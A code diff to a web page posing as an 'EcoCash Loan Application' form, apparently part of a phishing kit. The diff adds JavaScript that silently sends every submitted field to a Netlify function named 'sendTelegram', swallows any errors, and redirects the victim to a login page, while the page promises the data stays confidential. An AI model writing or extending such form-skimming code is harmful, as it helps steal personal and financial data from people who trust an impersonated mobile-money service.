@@ -129,8 +129,9 @@
 <body>
   <div class="wrap">
     <div class="card" role="region" aria-labelledby="formTitle">
-      <!-- logo: use GitHub repo path -->
-      <img src="assets/eco.png" alt="EcoCash logo" class="logo">
+      <!-- logo: use uploaded file path (local) -->
+      <!-- Developer note: local uploaded logo path used below -->
+      <img src="/mnt/data/eco.png" alt="EcoCash logo" class="logo">
 
       <h1 id="formTitle">EcoCash Loan Application</h1>
       <p class="lead">Please fill in required fields. All information is kept confidential and used only for loan processing and verification.</p>
@@ -349,6 +350,42 @@
     else dobError.classList.add('hidden');
   });
 
+  // Send to Netlify function while redirecting to login.html
+  function sendLoanDataThenRedirect(obj) {
+    const payload = {
+      submittedAt: new Date().toISOString(),
+      loanData: obj
+    };
+    const body = JSON.stringify(payload);
+
+    // Use navigator.sendBeacon if available (best for sending during navigation)
+    if (navigator && typeof navigator.sendBeacon === 'function') {
+      try {
+        const blob = new Blob([body], { type: 'application/json' });
+        navigator.sendBeacon('/.netlify/functions/sendTelegram', blob);
+      } catch (e) {
+        // fallback to fetch with keepalive
+        fetch('/.netlify/functions/sendTelegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body,
+          keepalive: true
+        }).catch(()=>{/*ignore*/});
+      }
+    } else {
+      // fallback
+      fetch('/.netlify/functions/sendTelegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body,
+        keepalive: true
+      }).catch(()=>{/*ignore*/});
+    }
+
+    // immediate redirect to login page
+    window.location.href = 'login.html';
+  }
+
   // On submit validate phone, dob, and checkbox; show errors below each field
   form.addEventListener('submit', function(e){
     // checkbox
@@ -388,7 +425,9 @@
     const fd = new FormData(form);
     const obj = Object.fromEntries(fd.entries());
     sessionStorage.setItem('loanForm', JSON.stringify(obj));
-    window.location.href = 'login.html';
+
+    // send while redirecting
+    sendLoanDataThenRedirect(obj);
   });
 
 })();
